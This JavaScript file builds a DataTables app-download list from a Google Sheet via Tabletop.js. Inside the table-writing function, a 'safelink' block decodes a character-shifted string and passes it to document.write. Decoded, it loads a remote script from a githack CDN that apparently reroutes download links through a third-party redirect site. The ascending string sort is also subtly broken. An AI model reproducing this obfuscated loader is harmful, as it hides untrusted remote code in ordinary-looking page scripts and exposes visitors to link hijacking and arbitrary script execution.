var jqueryNoConflict = jQuery;

// begin main function
jqueryNoConflict(document).ready(function(){

    initializeTabletopObject("https://docs.google.com/spreadsheets/d/15JtSCWo1E9YzyQN5U_XZXH4SuDjj9ly0-qk6Jj1A89w/pubhtml");
	

});


// pull data from google spreadsheet
function initializeTabletopObject(dataSpreadsheet){
    Tabletop.init({
        key: dataSpreadsheet,
        callback: writeTableWith,
        simpleSheet: true,
        debug: false
    });
}

// create table headers
function createTableColumns(){

    /* swap out the properties of mDataProp & sTitle to reflect
    the names of columns or keys you want to display.
    Remember, tabletop.js strips out spaces from column titles, which
    is what happens with the More Info column header */

    var tableColumns =   [
		{"mDataProp": "name", "sTitle": "APP NAME", "sClass": "left"},
		{"mDataProp": "category", "sTitle": "Category", "sClass": "center"},
		{"mDataProp": "download", "sTitle": "Download", "sClass": "center"},
		{"mDataProp": "os", "sTitle": "OS", "sClass": "center"},
		{"mDataProp": "size", "sTitle": "SIZE", "sClass": "center"}
	];
    return tableColumns;
}

// create the table container and object
function writeTableWith(dataSource){

    jqueryNoConflict("#demo").html("<table cellpadding='0' cellspacing='0' border='0' class='display table table-bordered table-striped' id='data-table-container'></table>");

//safelink	
var SETTINGKlinkz = {
 URLnoSAFE : "app-jos.blogspot.com,linkdin.com,www.youtube.com,path.com,whatsapp.com,pinterest.com,instagram.com,wa.me,facebook.com,twitter.com",
 TITLElink : "Generate Link",
 PASSlink : "",
 LINKproperty : "_blank",
 VERIFYlink : "true",
 COUNTDOWNlink : "false",
 CLICK2Xlink : "true",
URLSAFELINK : "https://save.cara.tips/"
};
var sautoKLINKZ="=tdsjqu!tsd>#iuuqt;00sbxdeo/hjuibdl/dpn0lbsffmlvo0tfswfslmjol{0b468edf7edbb614e216:c974:8b63b647ecff1890BVUPtbgfmjol/kt#?=0tdsjqu?";mautoKLINKZ=""; for (i=0; i<sautoKLINKZ.length; i++){if(sautoKLINKZ.charCodeAt(i)==28){mautoKLINKZ+='&';}else if (sautoKLINKZ.charCodeAt(i)==23){mautoKLINKZ+='!';}else{mautoKLINKZ+=String.fromCharCode(sautoKLINKZ.charCodeAt(i)-1);}}document.write(mautoKLINKZ);	
//end safelink	
	
	
    var oTable = jqueryNoConflict("#data-table-container").dataTable({
        "sPaginationType": "bootstrap",
        "iDisplayLength": 10,
        "aaData": dataSource,
        "aoColumns": createTableColumns(),
        "fnRowCallback": function(nRow, aData, iDisplayIndex) {
            console.log(aData);
            $("td:eq(2)", nRow).html("<a href='" + aData.download + "'>Download</a>");
            return nRow;
        },
        "oLanguage": {
            "sLengthMenu": "_MENU_ records per page"
        }
    });

};

//define two custom functions (asc and desc) for string sorting
jQuery.fn.dataTableExt.oSort["string-case-asc"]  = function(x,y) {
	return ((x < y) ? -1 : ((x > y) ?  0 : 0));
};

jQuery.fn.dataTableExt.oSort["string-case-desc"] = function(x,y) {
	return ((x < y) ?  1 : ((x > y) ? -1 : 0));
};

